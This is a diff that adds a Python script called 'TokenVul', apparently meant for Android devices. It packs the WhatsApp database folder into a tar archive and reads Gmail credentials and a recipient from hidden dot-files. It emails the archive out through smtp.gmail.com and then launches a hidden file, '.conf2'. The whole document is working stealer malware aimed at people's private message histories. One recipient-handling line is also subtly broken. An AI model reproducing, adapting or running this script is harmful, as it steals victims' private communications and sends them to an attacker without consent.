@@ -1,0 +1,42 @@
+#TokenVul
+#by NePtYx
+import os
+resultado = os.system("tar -cvf WathsapData.tar /sdcard/WhatsApp/Databases ")
+import smtplib
+from email.mime.multipart import MIMEMultipart
+from email.mime.text import MIMEText
+from email.mime.base import MIMEBase
+from email import encoders
+f = open(".gmail1.txt", "r")
+contenttt = f.read()
+f = open(".pwd.txt", "r")
+contentt = f.read()
+f = open(".gmail.txt", "r")
+content = f.read()
+remitente = (content)
+destinatarios = (contenttt)
+ruta_adjunto = 'WathsapData.tar'
+nombre_adjunto = 'WathsapData.tar'
+mensaje = MIMEMultipart()
+mensaje['From'] = remitente
+mensaje['To'] = ", ".join(destinatarios)
+archivo_adjunto = open(ruta_adjunto, 'rb')
+adjunto_MIME = MIMEBase('application', 'octet-stream')
+adjunto_MIME.set_payload((archivo_adjunto).read())
+encoders.encode_base64(adjunto_MIME)
+adjunto_MIME.add_header('Content-Disposition', "attachment; filename= %s" % 
+nombre_adjunto)
+mensaje.attach(adjunto_MIME)
+sesion_smtp = smtplib.SMTP('smtp.gmail.com', 587)
+sesion_smtp.starttls()
+username = (content)
+password = (contentt)
+sesion_smtp.login(username,password)
+texto = mensaje.as_string()
+sesion_smtp.sendmail(remitente, destinatarios, texto)
+sesion_smtp.quit()
+f.close()
+f.close()
+f.close()
+import os
+resultado = os.system("python .conf2")
